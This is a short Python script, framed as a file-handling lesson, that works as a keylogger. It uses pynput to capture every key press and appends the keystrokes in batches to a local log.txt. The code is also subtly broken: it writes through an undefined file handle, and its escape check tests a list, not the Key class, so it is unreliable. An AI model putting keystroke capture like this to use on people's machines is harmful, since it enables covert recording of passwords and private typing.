# Storing Key strokes in a text file
# File Handling- How to read write and append to a file
import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def key_press(key):
    global keys, count
    keys.append(key)
    count +=1
    print(f"{key} pressed")
    
    if count >= 15:
        count = 0
        write_file(keys)
        keys = []
    
def write_file(keys):
    with open("log.txt","a") as F:
        for key in keys:
            k = str(key).replace('"', " ")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find('Key') == -1:
                f.write(k)
            

def key_release(key):
    if key == keys.esc:
        return False
    
    
with Listener(on_press=key_press, on_release=key_release) as listener:
    listener.join()